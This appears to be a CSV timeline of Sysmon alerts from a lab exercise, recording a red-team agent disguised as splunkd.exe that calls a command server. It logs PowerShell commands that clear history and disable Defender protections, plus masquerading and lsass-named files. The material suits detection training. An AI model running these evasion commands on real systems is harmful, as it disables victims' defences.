"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:12:37.653 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172662,"Path: C:\Windows\System32\4bd145_T1036.007_masquerading.vbs ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:12:37.649 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.650","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.665 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172663,"Path: C:\Windows\System32\107417_T1036.007_masquerading.ps1 ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:12:37.663 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.664","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.745 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172668,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xls.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.745 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.745","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.747 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172669,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.xlsx.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.746 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.746","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.749 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172670,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.png.vbs ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.748 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.748","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.750 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172671,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.750 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.750","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.752 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172672,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.751 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.751","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.753 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172673,"Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.753 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.753","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.076 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172684,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_tqtmkh3c.b43.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300","CreationUtcTime: 2025-12-23 13:12:42.064 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.064","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.287 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172686,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_i5ky5abo.eb1.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300","CreationUtcTime: 2025-12-23 13:12:42.281 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.283","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.491 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172688,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_yy5vwjfu.qh4.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300","CreationUtcTime: 2025-12-23 13:12:42.486 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:42.486","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.758 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172690,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_cz4x404u.i3l.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300","CreationUtcTime: 2025-12-23 13:13:20.749 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:20.749","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:21.058 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172692,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_yawbrd4y.pfm.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300","CreationUtcTime: 2025-12-23 13:13:21.056 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:21.056","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.768 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172696,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_q0gsia31.m4e.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4408 ¦ PGUID: E9F06A57-9595-694A-D702-000000002300","CreationUtcTime: 2025-12-23 13:13:57.766 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:57.766","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:19:22.334 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172713,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_qemgwaag.gup.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3168 ¦ PGUID: E9F06A57-96DA-694A-E602-000000002300","CreationUtcTime: 2025-12-23 13:19:22.331 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:19:22.331","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.699 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172639,"Rule: EXE ¦ Path: C:\Windows\Temp\debug.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300","CreationUtcTime: 2025-12-23 13:07:52.698 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:07:52.698","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.735 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172665,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.docx.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.732 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.734","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.741 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172666,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.740 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.740","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:37.743 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172667,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.ps1.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 8516 ¦ PGUID: E9F06A57-9545-694A-C402-000000002300","CreationUtcTime: 2025-12-23 13:12:37.742 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:12:37.742","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:57.689 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172694,"Rule: EXE ¦ Path: C:\Windows\System32\1db90b_T1036.003.exe ¦ Proc: C:\Users\Public\splunkd.exe ¦ PID: 2972 ¦ PGUID: E9F06A57-8EA3-694A-5C02-000000002300","CreationUtcTime: 2025-12-23 13:13:57.688 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:13:57.688","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:16:21.983 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172705,"Rule: EXE ¦ Path: C:\lsm.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 1012 ¦ PGUID: E9F06A57-9625-694A-DF02-000000002300","CreationUtcTime: 2025-12-23 13:16:21.982 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:16:21.982","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:18:25.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172710,"Rule: EXE ¦ Path: C:\Windows\Temp\lsass.exe ¦ Proc: C:\WINDOWS\system32\cmd.exe ¦ PID: 3648 ¦ PGUID: E9F06A57-96A0-694A-E402-000000002300","CreationUtcTime: 2025-12-23 13:18:25.043 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:18:25.043","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:09:33.848 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",172653,"Rule: T1089 ¦ EventType: SetValue ¦ TgtObj: HKLM\System\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile\EnableFirewall ¦ DWORD (0x00000000) ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 1588 ¦ PGUID: E9F06A57-7C75-694A-1E00-000000002300","User: NT AUTHORITY\LOCAL SERVICE ¦ UtcTime: 2025-12-23 13:09:33.848","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:04:39.319 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172629,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 6268 ¦ PGUID: E9F06A57-9367-694A-AB02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:04:39.316","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:05:15.346 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172631,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-PSReadlineOption -HistorySaveStyle SaveNothing"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5240 ¦ PGUID: E9F06A57-938B-694A-AC02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:05:15.337","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:06:17.380 +01:00","Proc Exec","info","DESKTOP-G2OBL3D","Sysmon",1,"","","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","Sysmon_1_Info_ProcExec.yml","85790e3e-e270-499f-a6ad-f8afe85c35f1","C:\Tools\Logs\mc_defense.evtx"
